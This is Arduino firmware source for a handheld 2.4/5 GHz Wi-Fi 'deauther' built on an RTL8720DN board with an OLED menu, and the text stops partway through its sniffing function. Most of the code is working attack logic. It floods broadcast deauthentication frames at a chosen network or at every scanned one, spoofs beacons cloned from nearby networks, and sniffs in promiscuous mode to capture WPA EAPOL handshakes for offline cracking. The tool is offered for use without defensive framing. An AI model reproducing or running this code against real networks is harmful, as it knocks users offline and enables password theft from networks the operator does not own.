// Oled code made by warwick320 // updated by Cypher --> github.com/dkyazzentwatwa/cypher-5G-deauther
// Updated again by Nickguitar --> github.com/Nickguitar/cypher-5G-deauther

// Global flag to indicate that the sniff callback has been triggered.
volatile bool sniffCallbackTriggered = false;

// Wifi
#include "wifi_conf.h"
#include "wifi_cust_tx.h"
#include "wifi_util.h"
#include "wifi_structures.h"
#include "WiFi.h"
#include "WiFiServer.h"
#include "WiFiClient.h"
#include "wifi_constants.h"

// Misc
#undef max
#undef min
#include <SPI.h>
#define SPI_MODE0 0x00
#include "vector"
#include "map"
#include "debug.h"
#include <Wire.h>

// Display
#include <Adafruit_GFX.h>
#include <Adafruit_SSD1306.h>
#define SCREEN_WIDTH 128
#define SCREEN_HEIGHT 64
#define OLED_RESET -1
Adafruit_SSD1306 display(SCREEN_WIDTH, SCREEN_HEIGHT, &Wire, OLED_RESET);

// Pins
#define BTN_DOWN PA27
#define BTN_UP PA12
#define BTN_OK PA13


#define TOTAL_MENU_ITEMS 5
const char* mainMenuItems[TOTAL_MENU_ITEMS] = { "Attack", "Scan", "Select", "Sniff", "Deauth+Sniff" };

// Animation frames for spinner.
const char spinnerChars[] = { '/', '-', '\\', '|' };
unsigned int spinnerIndex = 0;

// Constants for the ADC and voltage divider
#define BATTERY_PIN PB3            // ADC pin connected to the resistor divider junction
#define ADC_REF_VOLTAGE 3.3        // ADC reference voltage (in volts)
#define ADC_MAX 1023.0             // Maximum ADC value for a 10-bit ADC
const unsigned long BATTERY_MEASURE_INTERVAL = 5000; // 30 seconds (in milliseconds)
unsigned long lastBatteryMeasure = 0;                 // Tracks the last time we measured

// Resistor values (in ohms)
const float R1 = 68000.0;          // 68kΩ resistor (between battery positive and ADC node)
const float R2 = 220000.0;         // 220kΩ resistor (between ADC node and ground)

// Voltage divider factor to recover the battery voltage:
// batteryVoltage = measuredVoltage * (R1 + R2) / R2
const float voltageDividerFactor = (R1 + R2) / R2; // ≈ 1.3091

// Battery voltage range for calculating percentage (adjust these as needed)
const float batteryMinVoltage = 3.3; // Voltage at 0%
const float batteryMaxVoltage = 3.8; // Voltage at 100%

// Store the latest measured values
float lastBatteryVoltage = 0.0;
float lastBatteryPercentage = 0.0;

// These globals control which items are visible.
int menuOffset = 0;     // Either 0 or 1 in our case.
int selectedIndex = 0;  // 0 to 2 (the visible slot index)

bool webserverActive = false;
int selectedNetworkIndex = 0;

// VARIABLES
typedef struct {
  String ssid;
  String bssid_str;
  uint8_t bssid[6];
  int security;
  short rssi;
  uint channel;
} WiFiScanResult;


// Define a structure for storing handshake data.
#define MAX_FRAME_SIZE 512
#define MAX_HANDSHAKE_FRAMES 4
#define MAX_MANAGEMENT_FRAMES 10

struct HandshakeFrame {
  unsigned int length;
  unsigned char data[MAX_FRAME_SIZE];
};

struct HandshakeData {
  HandshakeFrame frames[MAX_HANDSHAKE_FRAMES];
  unsigned int frameCount;
};

HandshakeData capturedHandshake;

struct ManagementFrame {
  unsigned int length;
  unsigned char data[MAX_FRAME_SIZE];
};

struct ManagementData {
  ManagementFrame frames[MAX_MANAGEMENT_FRAMES];
  unsigned int frameCount;
};

ManagementData capturedManagement;

// Webserver
#include "webserver.h"

// Function to reset both handshake and management frame data.
void resetCaptureData() {
  capturedHandshake.frameCount = 0;
  memset(capturedHandshake.frames, 0, sizeof(capturedHandshake.frames));
  capturedManagement.frameCount = 0;
  memset(capturedManagement.frames, 0, sizeof(capturedManagement.frames));
}


// Credentials for you Wifi network
char *ssid = "0x7359";
char *pass = "0123456789";

int current_channel = 1;
std::vector<WiFiScanResult> scan_results;
WiFiServer server(80);
bool deauth_running = false;
uint8_t deauth_bssid[6];
uint8_t becaon_bssid[6];
uint16_t deauth_reason;
String SelectedSSID;
String SSIDCh;

int attackstate = 0;
int menustate = 0;
bool menuscroll = true;
bool okstate = true;
int scrollindex = 0;
int perdeauth = 3;

// timing variables
unsigned long lastDownTime = 0;
unsigned long lastUpTime = 0;
unsigned long lastOkTime = 0;
const unsigned long DEBOUNCE_DELAY = 150;

// IMAGES
static const unsigned char PROGMEM image_wifi_not_connected__copy__bits[] = { 0x21, 0xf0, 0x00, 0x16, 0x0c, 0x00, 0x08, 0x03, 0x00, 0x25, 0xf0, 0x80, 0x42, 0x0c, 0x40, 0x89, 0x02, 0x20, 0x10, 0xa1, 0x00, 0x23, 0x58, 0x80, 0x04, 0x24, 0x00, 0x08, 0x52, 0x00, 0x01, 0xa8, 0x00, 0x02, 0x04, 0x00, 0x00, 0x42, 0x00, 0x00, 0xa1, 0x00, 0x00, 0x40, 0x80, 0x00, 0x00, 0x00 };

// Auxiliary function for the result.security value
String getSecurityString(unsigned int secVal) {
  switch(secVal) {
    case 0:          return "OPEN";
    case 1:          return "WEP_PSK";
    case 32769:      return "WEP_SHARED";
    case 2097154:    return "WPA_TKIP_PSK";
    case 2097156:    return "WPA_AES_PSK";
    case 4194306:    return "WPA2_TKIP_PSK";
    case 4194308:    return "WPA2_AES_PSK";
    case 4194310:    return "WPA2_MIXED_PSK";
    case 6291456:    return "WPA_WPA2_MIXED";
    case 268435456:  return "WPS_OPEN";
    case 268435460:  return "WPS_SECURE";
    default:         return "UNKNOWN";
  }
}


rtw_result_t scanResultHandler(rtw_scan_handler_result_t *scan_result) {
  rtw_scan_result_t *record;
  if (scan_result->scan_complete == 0) {
    record = &scan_result->ap_details;
    record->SSID.val[record->SSID.len] = 0;
    WiFiScanResult result;
    result.ssid = String((const char *)record->SSID.val);
    result.channel = record->channel;
    result.rssi = record->signal_strength;
    result.security  = record->security; // TODO: display this somewhere (bigger display version?)
    memcpy(&result.bssid, &record->BSSID, 6);
    char bssid_str[] = "XX:XX:XX:XX:XX:XX";
    snprintf(bssid_str, sizeof(bssid_str), "%02X:%02X:%02X:%02X:%02X:%02X", result.bssid[0], result.bssid[1], result.bssid[2], result.bssid[3], result.bssid[4], result.bssid[5]);
    result.bssid_str = bssid_str;
    scan_results.push_back(result);
  }
  return RTW_SUCCESS;
}

void selectedmenu(String text) {
  display.setTextColor(SSD1306_BLACK, SSD1306_WHITE);
  display.println(text);
  display.setTextColor(SSD1306_WHITE, SSD1306_BLACK);
}

int scanNetworks() {
  DEBUG_SER_PRINT("Scanning WiFi Networks (5s)...");
  scan_results.clear();
  if (wifi_scan_networks(scanResultHandler, NULL) == RTW_SUCCESS) {
    delay(5000);
    DEBUG_SER_PRINT(" Done!\n");
    return 0;
  } else {
    DEBUG_SER_PRINT(" Failed!\n");
    return 1;
  }
}

void Single() {
  display.clearDisplay();
  display.setTextColor(SSD1306_WHITE);
  display.setTextSize(1);
  display.setCursor(5, 25);
  display.println("Single Attack...");
  display.display();
  while (true) {
    memcpy(deauth_bssid, scan_results[scrollindex].bssid, 6);
    wext_set_channel(WLAN0_NAME, scan_results[scrollindex].channel);
    if (digitalRead(BTN_OK) == LOW) {
      delay(100);
      break;
    }
    deauth_reason = 1;
    wifi_tx_deauth_frame(deauth_bssid, (void *)"\xFF\xFF\xFF\xFF\xFF\xFF", deauth_reason);
    deauth_reason = 4;
    wifi_tx_deauth_frame(deauth_bssid, (void *)"\xFF\xFF\xFF\xFF\xFF\xFF", deauth_reason);
    deauth_reason = 16;
    wifi_tx_deauth_frame(deauth_bssid, (void *)"\xFF\xFF\xFF\xFF\xFF\xFF", deauth_reason);
  }
}

void All() {
  display.clearDisplay();
  display.setTextColor(SSD1306_WHITE);
  display.setTextSize(1);
  display.setCursor(5, 25);
  display.println("Attacking All...");
  display.display();
  while (true) {
    if (digitalRead(BTN_OK) == LOW) {
      delay(100);
      break;
    }
    for (size_t i = 0; i < scan_results.size(); i++) {
      memcpy(deauth_bssid, scan_results[i].bssid, 6);
      wext_set_channel(WLAN0_NAME, scan_results[i].channel);
      for (int x = 0; x < perdeauth; x++) {
        deauth_reason = 1;
        wifi_tx_deauth_frame(deauth_bssid, (void *)"\xFF\xFF\xFF\xFF\xFF\xFF", deauth_reason);
        deauth_reason = 4;
        wifi_tx_deauth_frame(deauth_bssid, (void *)"\xFF\xFF\xFF\xFF\xFF\xFF", deauth_reason);
        deauth_reason = 16;
        wifi_tx_deauth_frame(deauth_bssid, (void *)"\xFF\xFF\xFF\xFF\xFF\xFF", deauth_reason);
      }
    }
  }
}

void BecaonDeauth() {
  display.clearDisplay();
  display.setTextColor(SSD1306_WHITE);
  display.setTextSize(1);
  display.setCursor(5, 25);
  display.println("Beacon+Deauth Attack...");
  display.display();
  while (true) {
    if (digitalRead(BTN_OK) == LOW) {
      delay(100);
      break;
    }
    for (size_t i = 0; i < scan_results.size(); i++) {
      String ssid1 = scan_results[i].ssid;
      const char *ssid1_cstr = ssid1.c_str();
      memcpy(becaon_bssid, scan_results[i].bssid, 6);
      memcpy(deauth_bssid, scan_results[i].bssid, 6);
      wext_set_channel(WLAN0_NAME, scan_results[i].channel);
      for (int x = 0; x < 10; x++) {
        wifi_tx_beacon_frame(becaon_bssid, (void *)"\xFF\xFF\xFF\xFF\xFF\xFF", ssid1_cstr);
        wifi_tx_deauth_frame(deauth_bssid, (void *)"\xFF\xFF\xFF\xFF\xFF\xFF", 0);
      }
    }
  }
}

void Becaon() {
  display.clearDisplay();
  display.setTextColor(SSD1306_WHITE);
  display.setTextSize(1);
  display.setCursor(5, 25);
  display.println("Beacon Attack...");
  display.display();
  while (true) {
    if (digitalRead(BTN_OK) == LOW) {
      delay(100);
      break;
    }
    for (size_t i = 0; i < scan_results.size(); i++) {
      String ssid1 = scan_results[i].ssid;
      const char *ssid1_cstr = ssid1.c_str();
      memcpy(becaon_bssid, scan_results[i].bssid, 6);
      wext_set_channel(WLAN0_NAME, scan_results[i].channel);
      for (int x = 0; x < 10; x++) {
        wifi_tx_beacon_frame(becaon_bssid, (void *)"\xFF\xFF\xFF\xFF\xFF\xFF", ssid1_cstr);
      }
    }
  }
}

// Custom UI elements
void drawFrame() {
  display.drawRect(0, 0, SCREEN_WIDTH, SCREEN_HEIGHT, WHITE);
  display.drawRect(2, 2, SCREEN_WIDTH - 4, SCREEN_HEIGHT - 4, WHITE);
}

void drawProgressBar(int x, int y, int width, int height, int progress) {
  display.drawRect(x, y, width, height, WHITE);
  display.fillRect(x + 2, y + 2, (width - 4) * progress / 100, height - 4, WHITE);
}

void drawMenuItem(int y, const char *text, bool selected) {
  if (selected) {
    display.fillRect(4, y - 1, SCREEN_WIDTH - 8, 11, WHITE);
    display.setTextColor(BLACK);
  } else {
    display.setTextColor(WHITE);
  }
  display.setCursor(8, y);
  display.print(text);
}

void drawStatusBar(const char *status) {
  display.fillRect(0, 0, SCREEN_WIDTH, 10, WHITE);
  display.setTextColor(BLACK);
  display.setCursor(4, 1);
  display.print(status);

  // Right side: show the last measured battery percentage
  display.setCursor(SCREEN_WIDTH - 25, 1);
  display.print(lastBatteryPercentage, 0);
  display.print("%");
  
  display.setTextColor(WHITE);
}

void drawMainMenu() {
  display.clearDisplay();
  drawStatusBar("MAIN MENU");
  drawFrame();

  // Display three items starting at menuOffset.
  for (int i = 0; i < 4; i++) {
    int itemIndex = i + menuOffset;
    drawMenuItem(20 + (i * 15), mainMenuItems[itemIndex], (i == selectedIndex));
  }

  // Draw scroll arrows on the right side.
  int arrowX = SCREEN_WIDTH - 12;

  // For the up arrow: if menuOffset > 0, there are items above.
  if (menuOffset > 0) {
    // If the first row (i.e. visible row index 0) is selected, draw arrow in BLACK.
    uint16_t upArrowColor = (selectedIndex == 0) ? BLACK : WHITE;
    display.fillTriangle(arrowX, 25, arrowX + 4, 20, arrowX + 8, 25, upArrowColor);
  }

  // For the down arrow: if there are items below.
  if (menuOffset < TOTAL_MENU_ITEMS - 3) {
    // If the bottom row (i.e. visible row index 2) is selected, use BLACK.
    uint16_t downArrowColor = (selectedIndex == 2) ? BLACK : WHITE;
    display.fillTriangle(arrowX, 55, arrowX + 4, 60, arrowX + 8, 55, downArrowColor);
  }

  display.display();
}



void drawScanScreen() {
  display.clearDisplay();
  drawFrame();
  drawStatusBar("SCANNING");

  // Animated scanning effect
  static const char *frames[] = { "/", "-", "\\", "|" };
  for (int i = 0; i < 20; i++) {
    display.setCursor(48, 30);
    display.setTextSize(1);
    display.print("Scanning ");
    display.print(frames[i % 4]);
    drawProgressBar(20, 45, SCREEN_WIDTH - 40, 8, i * 5);
    display.display();
    delay(250);
  }
}

// Map RSSI (in dBm) to a number of bars (1 to 4).
int getSignalBars(short rssi) {
  if (rssi >= -60)
    return 4;
  else if (rssi >= -70)
    return 3;
  else if (rssi >= -80)
    return 2;
  else
    return 1;
}


// draw a simple WiFi signal icon with 4 vertical bars
// x,y specifies the top-left corner where the icon is drawn
void drawSignalBars(int x, int y, int bars, uint16_t color) {
  const int barWidth = 2;
  const int gap = 1;
  // Heights for the 4 bars (from left to right)
  const int heights[4] = {3, 5, 7, 9};
  
  // Only draw up to 'bars' filled rectangles
  for (int i = 0; i < bars && i < 4; i++) {
    int barX = x + i * (barWidth + gap);
    int barY = y + (10 - heights[i]);  // Align bars at the bottom of a 10-pixel tall area
    display.fillRect(barX, barY, barWidth, heights[i], color);
  }
}


// New function to draw the network list screen with 5 visible networks
void drawNetworkList() {
  display.clearDisplay();
  
  // Build a vector of valid network indices (only networks with a non-empty SSID)
  std::vector<int> validIndices;
  for (size_t i = 0; i < scan_results.size(); i++) {
    if (scan_results[i].ssid.length() > 0) {
      validIndices.push_back(i);
    }
  }
  
  // ---- Header: "NETWORKS (count)" on left, battery % on right ----
  display.setTextSize(1);
  String networks = "NETWORKS (";
  networks += String(validIndices.size()) + ")";

  drawStatusBar(networks.c_str());
  
  display.setCursor(SCREEN_WIDTH - 40, 1);
  display.print(lastBatteryPercentage, 0);
  display.print("%");
  
  // If no valid networks, display a message and return
  if (validIndices.size() == 0) {
    display.setCursor(4, 20);
    display.print("No networks");
    display.display();
    return;
  }
  
  // ---- Calculate which networks to show ----
  // 'scrollindex' now refers to the index within validIndices (0 to validIndices.size()-1)
  int selectedIndex = scrollindex;
  int firstVisible = selectedIndex - 2;
  if (firstVisible < 0) {
    firstVisible = 0;
  }
  if (firstVisible > (int)validIndices.size() - 5) {
    firstVisible = validIndices.size() - 5;
    if (firstVisible < 0) firstVisible = 0;
  }
  
  // ---- Draw 5 rows using a smaller vertical spacing ----
  int startY = 16;     // starting Y position for the first network row
  int lineHeight = 10; // smaller line height for a small screen
  
  for (int i = 0; i < 5; i++) {
    int idx = firstVisible + i;
    if (idx < validIndices.size()) {
      int netIdx = validIndices[idx];
      // Get network name and truncate if too long.
      String networkName = scan_results[netIdx].ssid;
      if (networkName.length() > 10) {
        networkName = networkName.substring(0, 10) + "..";
      }
      // determine channel type string
      String channelStr = (scan_results[netIdx].channel >= 36) ? "5G" : "2.4G";
      
      int y = startY + i * lineHeight;
      
      // ff this row is the selected one, draw a white rectangle behind it
      bool isSelected = (idx == selectedIndex);
      if (isSelected) {
        display.fillRect(0, y, SCREEN_WIDTH, lineHeight, WHITE);
        display.setTextColor(BLACK, WHITE);
      } else {
        display.setTextColor(SSD1306_WHITE, BLACK);
      }
      
      // Draw network name on the left
      display.setCursor(2, y);
      display.print(networkName);
      
      // Draw channel info on the right
      display.setCursor(SCREEN_WIDTH - 50, y);
      display.print(channelStr);

      // Determine colors for the signal bars.
      uint16_t barColor = isSelected ? BLACK : SSD1306_WHITE;
      
      // Compute number of bars based on the network's RSSI.
      int bars = getSignalBars(scan_results[netIdx].rssi);
      // Draw the signal bars icon a few pixels to the right of the channel text.
      int iconX = SCREEN_WIDTH - 20;  // adjust as needed
      drawSignalBars(iconX, y, bars, barColor);
      
      // If on the top row and there are networks above, show an up arrow
      if (i == 0 && firstVisible > 0) {
        display.fillTriangle(SCREEN_WIDTH - 6, 24, SCREEN_WIDTH - 4, 19, SCREEN_WIDTH - 2, 24, WHITE);
      }
      
      // If on the bottom row and there are more networks below, show a down arrow
      if (i == 2 && (firstVisible + 3) < validIndices.size()) {
        display.fillTriangle(SCREEN_WIDTH - 6, 55, SCREEN_WIDTH - 4, 60, SCREEN_WIDTH - 2, 55, WHITE);
      }
    }
  }
  
  display.display();
}

void drawAttackScreen(int attackType) {
  display.clearDisplay();
  drawFrame();

  // Warning banner
  display.fillRect(0, 0, SCREEN_WIDTH, 10, WHITE);
  display.setTextColor(BLACK);
  display.setCursor(4, 1);
  display.print("ATTACK IN PROGRESS");

  display.setTextColor(WHITE);
  display.setCursor(10, 20);

  // Attack type indicator
  const char *attackTypes[] = {
    "SINGLE DEAUTH",
    "ALL DEAUTH",
    "BEACON",
    "BEACON+DEAUTH"
  };

  if (attackType >= 0 && attackType < 4) {
    display.print(attackTypes[attackType]);
  }

  // Animated attack indicator
  static const char patterns[] = { '.', 'o', 'O', 'o' };
  for (int i = 0; i < sizeof(patterns); i++) {
    display.setCursor(10, 35);
    display.print("Attack in progress ");
    display.print(patterns[i]);
    display.display();
    delay(200);
  }
}
void titleScreen(void) {
  display.clearDisplay();
  display.setTextWrap(false);
  display.setTextSize(2);    
  display.setTextColor(WHITE);
  display.setCursor(7, 7);
  display.print("0x7359");
  display.setCursor(94, 48);
  //display.setFont(&Org_01);
  display.setTextSize(1);
  display.print("5 GHz");
  display.setCursor(82, 55);
  display.print("deauther");
  display.drawBitmap(52, 31, image_wifi_not_connected__copy__bits, 19, 16, 1);
  display.display();
  delay(400);
}

// New function to handle attack menu and execution
void attackLoop() {
  int attackState = 0;
  bool running = true;
  // Add this: Wait for button release before starting loop
  while (digitalRead(BTN_OK) == LOW) {
    delay(10);
  }

  while (running) {
    display.clearDisplay();
    drawFrame();
    drawStatusBar("ATTACK MODE");

    // Draw attack options
    const char *attackTypes[] = { "Single Deauth", "All Deauth", "Beacon", "Beacon+Deauth", "Back" };
    for (int i = 0; i < 5; i++) {
      drawMenuItem(15 + (i * 10), attackTypes[i], i == attackState);
    }
    display.display();

    // Handle button inputs
    if (digitalRead(BTN_OK) == LOW) {
      delay(150);
      if (attackState == 4) {  // Back option
        running = false;
      } else {
        // Execute selected attack
        drawAttackScreen(attackState);
        switch (attackState) {
          case 0:
            Single();
            break;
          case 1:
            All();
            break;
          case 2:
            Becaon();
            break;
          case 3:
            BecaonDeauth();
            break;
        }
      }
    }

    if (digitalRead(BTN_UP) == LOW) {
      delay(150);
      if (attackState < 4) attackState++;
    }

    if (digitalRead(BTN_DOWN) == LOW) {
      delay(150);
      if (attackState > 0) attackState--;
    }
  }
}

// New function to handle network selection
void networkSelectionLoop() {
  bool running = true;
  while (digitalRead(BTN_OK) == LOW) {
    delay(10);
  }
  
  std::vector<int> validIndices;
  for (size_t i = 0; i < scan_results.size(); i++) {
    if (scan_results[i].ssid.length() > 0) {
      validIndices.push_back(i);
    }
  }
  
  // The loop that lets the user scroll through validIndices remains unchanged...
  while (running) {
    drawNetworkList();
    
    if (digitalRead(BTN_OK) == LOW) {
      delay(150);
      while (digitalRead(BTN_OK) == LOW) {
        delay(10);
      }
      running = false;
    }
    
    // Handle UP/DOWN buttons as before (updating scrollindex)
    if (digitalRead(BTN_UP) == LOW) {
      delay(150);
      int validCount = validIndices.size();
      if (scrollindex < validCount - 1) {
        scrollindex++;
      }
    }
    if (digitalRead(BTN_DOWN) == LOW) {
      delay(150);
      if (scrollindex > 0) {
        scrollindex--;
      }
    }
    delay(50);
  }
  
  // After user selects a network, store the actual index:
  if (scrollindex < validIndices.size()) {
    selectedNetworkIndex = validIndices[scrollindex];
    SelectedSSID = scan_results[selectedNetworkIndex].ssid;
    SSIDCh = (scan_results[selectedNetworkIndex].channel >= 36) ? "5G" : "2.4G";
  }
}


void setup() {
  pinMode(BTN_DOWN, INPUT_PULLUP);
  pinMode(BTN_UP, INPUT_PULLUP);
  pinMode(BTN_OK, INPUT_PULLUP);

  Serial.begin(115200);
  if (!display.begin(SSD1306_SWITCHCAPVCC, 0x3C)) {
    Serial.println(F("SSD1306 init failed"));
    while (true)
      ;
  }
  titleScreen();
  DEBUG_SER_INIT();
  WiFi.apbegin(ssid, pass, (char *)String(current_channel).c_str());
  if (scanNetworks() != 0) {
    while (true) delay(1000);
  }

#ifdef DEBUG
  for (uint i = 0; i < scan_results.size(); i++) {
    DEBUG_SER_PRINT(scan_results[i].ssid + " ");
    for (int j = 0; j < 6; j++) {
      if (j > 0) DEBUG_SER_PRINT(":");
      DEBUG_SER_PRINT(scan_results[i].bssid[j], HEX);
    }
    DEBUG_SER_PRINT(" " + String(scan_results[i].channel) + " ");
    DEBUG_SER_PRINT(String(scan_results[i].rssi) + "\n");
  }
#endif
  SelectedSSID = scan_results[0].ssid;
  SSIDCh = scan_results[0].channel >= 36 ? "5G" : "2.4G";

      lastBatteryVoltage = getBatteryVoltage(); 
    lastBatteryPercentage = getBatteryPercentage();
}


void printHandshakeData() {
  Serial.println("---- Captured Handshake Data ----");
  Serial.print("Total handshake frames captured: ");
  Serial.println(capturedHandshake.frameCount);
  
  // Iterate through each stored handshake frame.
  for (unsigned int i = 0; i < capturedHandshake.frameCount; i++) {
    HandshakeFrame &hf = capturedHandshake.frames[i];
    Serial.print("Frame ");
    Serial.print(i + 1);
    Serial.print(" (");
    Serial.print(hf.length);
    Serial.println(" bytes):");
    
    // Print hex data in a formatted manner.
    for (unsigned int j = 0; j < hf.length; j++) {
      // Print a newline every 16 bytes with offset
      if (j % 16 == 0) {
        Serial.println();
        Serial.print("0x");
        Serial.print(j, HEX);
        Serial.print(": ");
      }
      // Print leading zero if needed.
      if (hf.data[j] < 16) {
        Serial.print("0");
      }
      Serial.print(hf.data[j], HEX);
      Serial.print(" ");
    }
    Serial.println();
    Serial.println("--------------------------------");
  }
  Serial.println("---- End of Handshake Data ----");
}

void printManagementData() {
  Serial.println("---- Captured Management Data ----");
  Serial.print("Total management frames captured: ");
  Serial.println(capturedManagement.frameCount);
  
  for (unsigned int i = 0; i < capturedManagement.frameCount; i++) {
    ManagementFrame &mf = capturedManagement.frames[i];
    Serial.print("Management Frame ");
    Serial.print(i + 1);
    Serial.print(" (");
    Serial.print(mf.length);
    Serial.println(" bytes):");
    
    for (unsigned int j = 0; j < mf.length; j++) {
      if (j % 16 == 0) {
        Serial.println();
        Serial.print("0x");
        Serial.print(j, HEX);
        Serial.print(": ");
      }
      if (mf.data[j] < 16) {
        Serial.print("0");
      }
      Serial.print(mf.data[j], HEX);
      Serial.print(" ");
    }
    Serial.println();
    Serial.println("--------------------------------");
  }
  Serial.println("---- End of Management Data ----");
}





// Updated function to scan the entire packet for EAPOL EtherType (0x88 0x8E)
// and print every instance it finds.
bool isEAPOLFrame(const unsigned char *packet, unsigned int length) {
  // Define the expected LLC+EAPOL sequence.
  const unsigned char eapol_sequence[] = {0xAA, 0xAA, 0x03, 0x00, 0x00, 0x00, 0x88, 0x8E};
  const unsigned int seq_len = sizeof(eapol_sequence);
  
  // Iterate through the packet and look for the sequence.
  for (unsigned int i = 0; i <= length - seq_len; i++) {
    bool match = true;
    for (unsigned int j = 0; j < seq_len; j++) {
      if (packet[i + j] != eapol_sequence[j]) {
        match = false;
        break;
      }
    }
    if (match) {
      Serial.print("EAPOL sequence found at offset: ");
      Serial.println(i);
      return true;
    }
  }
  return false;
}


// Helper function: extract frame type and subtype from the first two bytes.
void get_frame_type_subtype(const unsigned char *packet, unsigned int &type, unsigned int &subtype) {
  // Frame Control field is in the first two bytes (little endian)
  unsigned short fc = packet[0] | (packet[1] << 8);
  type = (fc >> 2) & 0x03;      // bits 2-3
  subtype = (fc >> 4) & 0x0F;   // bits 4-7
}

// Helper function: returns the offset at which the EAPOL payload starts
// Find the offset where the LLC+EAPOL signature starts.
unsigned int findEAPOLPayloadOffset(const unsigned char *packet, unsigned int length) {
  const unsigned char eapol_signature[] = {0xAA, 0xAA, 0x03, 0x00, 0x00, 0x00, 0x88, 0x8E};
  const unsigned int sig_len = sizeof(eapol_signature);
  for (unsigned int i = 0; i <= length - sig_len; i++) {
    bool match = true;
    for (unsigned int j = 0; j < sig_len; j++) {
      if (packet[i + j] != eapol_signature[j]) {
        match = false;
        break;
      }
    }
    if (match) return i;
  }
  return 0; // if not found, return 0 (compare full frame)
}

// Extract the Sequence Control field (assumes 24-byte header; bytes 22-23).
unsigned short getSequenceControl(const unsigned char *packet, unsigned int length) {
  if (length < 24) return 0;
  return packet[22] | (packet[23] << 8);
}

void rtl8720_sniff_callback(unsigned char *packet, unsigned int length, void* param) {
  sniffCallbackTriggered = true;
  
  unsigned int type, subtype;
  get_frame_type_subtype(packet, type, subtype);
  
  // --- Capture Management Frames (Beacons/Probe Responses) ---
  if (type == 0) {  // Management
    if (subtype == 8 || subtype == 5) { // Beacon or Probe Response
      if (capturedManagement.frameCount < MAX_MANAGEMENT_FRAMES) {
        ManagementFrame *mf = &capturedManagement.frames[capturedManagement.frameCount];
        mf->length = (length < MAX_FRAME_SIZE) ? length : MAX_FRAME_SIZE;
        memcpy(mf->data, packet, mf->length);
        capturedManagement.frameCount++;
        Serial.print("Stored management frame count: ");
        Serial.println(capturedManagement.frameCount);
      }
    }
  }
  
  // --- Capture EAPOL (Handshake) Frames ---
  // Check for LLC+EAPOL signature: AA AA 03 00 00 00 88 8E
  const unsigned char eapol_sequence[] = {0xAA, 0xAA, 0x03, 0x00, 0x00, 0x00, 0x88, 0x8E};
  const unsigned int seq_len = sizeof(eapol_sequence);
  bool isEAPOL = false;
  for (unsigned int i = 0; i <= length - seq_len; i++) {
    bool match = true;
    for (unsigned int j = 0; j < seq_len; j++) {
      if (packet[i + j] != eapol_sequence[j]) {
        match = false;
        break;
      }
    }
    if (match) { isEAPOL = true; break; }
  }
  
  if (isEAPOL) {
    Serial.println("EAPOL frame detected!");
    
    // Create a temporary handshake frame
    HandshakeFrame newFrame;
    newFrame.length = (length < MAX_FRAME_SIZE) ? length : MAX_FRAME_SIZE;
    memcpy(newFrame.data, packet, newFrame.length);
    
    // Extract the sequence control from the MAC header.
    unsigned short seqControl = getSequenceControl(newFrame.data, newFrame.length);
    // And find the EAPOL payload offset.
    unsigned int payloadOffset = findEAPOLPayloadOffset(newFrame.data, newFrame.length);
    unsigned int newPayloadLength = (payloadOffset < newFrame.length) ? (newFrame.length - payloadOffset) : newFrame.length;
    
    bool duplicate = false;
    for (unsigned int i = 0; i < capturedHandshake.frameCount; i++) {
      HandshakeFrame *stored = &capturedHandshake.frames[i];
      unsigned short storedSeq = getSequenceControl(stored->data, stored->length);
      unsigned int storedPayloadOffset = findEAPOLPayloadOffset(stored->data, stored->length);
      unsigned int storedPayloadLength = (storedPayloadOffset < stored->length) ? (stored->length - storedPayloadOffset) : stored->length;
      
      // First check: if sequence numbers differ, they are different frames.
      if (storedSeq == seqControl) {
        // Now compare the payload portion.
        if (storedPayloadLength == newPayloadLength &&
            memcmp(stored->data + storedPayloadOffset, newFrame.data + payloadOffset, newPayloadLength) == 0) {
          duplicate = true;
          Serial.print("Duplicate handshake frame (seq 0x");
          Serial.print(seqControl, HEX);
          Serial.println(") detected, ignoring.");
          break;
        }
      }
    }
    
    if (!duplicate && capturedHandshake.frameCount < MAX_HANDSHAKE_FRAMES) {
      memcpy(capturedHandshake.frames[capturedHandshake.frameCount].data, newFrame.data, newFrame.length);
      capturedHandshake.frames[capturedHandshake.frameCount].length = newFrame.length;
      capturedHandshake.frameCount++;
      Serial.print("Stored handshake frame count: ");
      Serial.println(capturedHandshake.frameCount);
      if (capturedHandshake.frameCount == MAX_HANDSHAKE_FRAMES) {
        Serial.println("Complete handshake captured!");
      }
    }
  }
}








// Function to enable promiscuous (sniffing) mode using RTL8720DN's API.
void enableSniffing() {
  Serial.println("Enabling sniffing mode...");
  
  // RTW_PROMISC_ENABLE_2 is used to enable promiscuous mode,
  // rtl8720_sniff_callback is our callback function,
  // and the third parameter (1) might specify additional options (e.g., channel filtering).
  wifi_set_promisc(RTW_PROMISC_ENABLE_2, rtl8720_sniff_callback, 1);
  
  Serial.println("Sniffing mode enabled. Waiting for packets...");
}

// Function to disable promiscuous mode.
void disableSniffing() {
  Serial.println("Disabling sniffing mode...");
  // Passing NULL as callback and RTW_PROMISC_DISABLE constant (if defined)
  wifi_set_promisc(RTW_PROMISC_DISABLE, NULL, 1);
  Serial.println("Sniffing mode disabled.");
}

// Updated startSniffing function that uses enableSniffing() and disableSniffing()
void startSniffing() {
  // Clear display and show initial message.
  display.clearDisplay();
  display.setTextSize(1);
  display.setTextColor(SSD1306_WHITE, SSD1306_BLACK);
  display.setCursor(5, 25);
  display.println("Sniffing...");
  display.display();

  // Reset capture buffers.
  resetCaptureData();

  // Set the channel to that of the target AP.
  wext_set_channel(WLAN0_NAME, scan_results[scrollindex].channel);
  Serial.print("Switched to channel: ");
  Serial.println(scan_results[scrollindex].channel);

  // Enable promiscuous mode.
  enableSniffing();
  

  
  // Continue sniffing until we have 4 handshake frames and at least one management frame, or until timeout (if zero handshake frames).
  unsigned long sniffStart = millis();
  const unsigned long timeout = 60000; // 60 seconds timeout
  bool cancelled = false;
  while ((capturedHandshake.frameCount < MAX_HANDSHAKE_FRAMES ||
          capturedManagement.frameCount == 0) &&
         (millis() - sniffStart) < timeout) {
      
      // Update the OLED display with the current handshake count and spinner animation.
      display.clearDisplay();
      display.setTextSize(1);
      display.setTextColor(SSD1306_WHITE, SSD1306_BLACK);
      display.setCursor(5, 10);
      display.print(spinnerChars[spinnerIndex % 4]);
      SSIDCh = scan_results[scrollindex].channel >= 36 ? "5G" : "2.4G";
      display.print(" Sniffing (");
      display.print(SSIDCh);
      display.print(")");
      display.setCursor(5, 25);
      display.print(SelectedSSID);
      
      
      // Draw the spinner animation on the next line.
      display.setCursor(5, 45);
      display.print("Captured EAPOL: ");
      display.print(capturedHandshake.frameCount);
      display.print("/4");
      
      display.display();
      
      spinnerIndex++; // Update spinner for next iteration.
      delay(100);

